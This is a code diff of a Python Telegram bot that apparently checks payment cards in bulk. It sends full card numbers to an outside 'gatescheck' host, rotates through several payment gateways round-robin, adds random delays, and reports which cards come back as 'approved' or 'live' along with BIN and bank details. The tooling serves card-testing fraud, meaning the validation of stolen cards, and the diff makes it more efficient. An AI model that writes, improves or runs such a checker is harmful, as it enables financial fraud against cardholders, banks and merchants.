@@ -25,6 +25,9 @@ ANTI_SPAM_SECONDS = 7
 user_tasks = {}
 CODES = {}
 
+# Round Robin Counter
+gateway_index = 0
+
 # ------------------- Async Semaphores -------------------
 
 api_semaphore = asyncio.Semaphore(6)
@@ -67,7 +70,6 @@ async def check_card_api(card_full, gateway_url):
     
     async with api_semaphore:
         try:
-            # تم إزالة البروكسي والاتصال مباشر الآن
             async with httpx.AsyncClient(timeout=25) as client:
                 r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
                 
@@ -190,6 +192,7 @@ async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"Error: {e}")
 
 async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global gateway_index
     user_id = update.effective_user.id
     card_full = " ".join(context.args)
     if not card_full:
@@ -199,12 +202,15 @@ async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ System Failure: Operational gateways unallocated.")
         return
         
-    for gateway in GATEWAYS:
-        start_time = time.time()
-        status, response = await check_card_api(card_full, gateway)
-        taken = round(time.time() - start_time, 2)
-        text = await format_response(card_full, status, response, taken, gateway, user_id)
-        await update.message.reply_text(text, parse_mode="Markdown")
+    # Pick one gateway using Round Robin
+    gateway = GATEWAYS[gateway_index % len(GATEWAYS)]
+    gateway_index += 1
+    
+    start_time = time.time()
+    status, response = await check_card_api(card_full, gateway)
+    taken = round(time.time() - start_time, 2)
+    text = await format_response(card_full, status, response, taken, gateway, user_id)
+    await update.message.reply_text(text, parse_mode="Markdown")
 
 # ------------------- Emergency Interrupt -------------------
 
@@ -236,6 +242,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ------------------- The Mass Panel Processing Loop -------------------
 
 async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global gateway_index
     user_id = update.effective_user.id
     stop_users[user_id] = False
     try:
@@ -262,34 +269,35 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text("❌ Engine Failure: Operational gateways empty.")
                 return
                 
-            for gateway in GATEWAYS:
-                if stop_users.get(user_id): break
-                    
-                start_time = time.time()
-                status, response = await check_card_api(card_full, gateway)
-                await asyncio.sleep(random.uniform(0, 5))
-                taken = round(time.time() - start_time, 2)
-                text = await format_response(card_full, status, response, taken, gateway, user_id)
+            # Pick one gateway using Round Robin for this card
+            gateway = GATEWAYS[gateway_index % len(GATEWAYS)]
+            gateway_index += 1
+            
+            start_time = time.time()
+            status, response = await check_card_api(card_full, gateway)
+            await asyncio.sleep(random.uniform(0, 5))
+            taken = round(time.time() - start_time, 2)
+            text = await format_response(card_full, status, response, taken, gateway, user_id)
+            
+            if status == "approved":
+                approved += 1
+                await update.message.reply_text(text, parse_mode="Markdown")
+            elif status == "live":
+                live += 1
+                await update.message.reply_text(text, parse_mode="Markdown")
+            else:
+                declined += 1
                 
-                if status == "approved":
-                    approved += 1
-                    await update.message.reply_text(text, parse_mode="Markdown")
-                elif status == "live":
-                    live += 1
-                    await update.message.reply_text(text, parse_mode="Markdown")
-                else:
-                    declined += 1
-                    
-                last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
-                gate_info = f"\n🌐 𝐆𝐚𝐭𝐞: `{gateway}`" if user_id in ADMINS else ""
+            last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
+            gate_info = f"\n🌐 𝐆𝐚𝐭𝐞: `{gateway}`" if user_id in ADMINS else ""
 
-                panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+            panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
          ▬▬ [ 𝐌𝐀𝐒𝐒 𝐏𝐀𝐘𝐏𝐀𝐋 ] ▬▬
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 ✅ 𝐂𝐡𝐚𝐫𝐠𝐞: `{approved}` 💎
 🟢 𝐋𝐢𝐯𝐞: `{live}` 🔋
 ❌ 𝐃e𝐜𝐥𝐢𝐧e𝐝: `{declined}`
-📂 𝐓𝐨𝐭𝐚𝐥 𝐋𝐨𝐨𝐩𝐬: `{approved + live + declined}`
+📂 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐬: `{approved + live + declined}`
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 💳 𝐋𝐚𝐬𝐭 𝐂𝐚𝐫𝐝: `{card_full}`
 📝 𝐑e𝐬𝐩b𝐧𝐬e: `{response}`{gate_info}
@@ -298,10 +306,10 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 🌍 𝐂b𝐮𝐧𝐭𝐫𝐲: `{last_country}`
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🛑 𝐒𝐭b𝐩: `{'ON' if stop_users.get(user_id) else 'OFF'}`"""
-                try:
-                    await panel_msg.edit_text(panel, parse_mode="Markdown")
-                except:
-                    pass
+            try:
+                await panel_msg.edit_text(panel, parse_mode="Markdown")
+            except:
+                pass
 
         await update.message.reply_text("✅ Success: Mass transaction loops executed completely.")
 
@@ -341,7 +349,7 @@ async def sent_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await asyncio.sleep(0.05)
         except:
             continue
-    await update.message.reply_text(f"✅ Broadcast complete. Message pushed to `{count}` users.", parse_mode="Markdown")
+    await update.message.reply_text(f"✅ Broadcast complete. Reached {count} users.")
 
 async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if await check_banned_guard(update): return
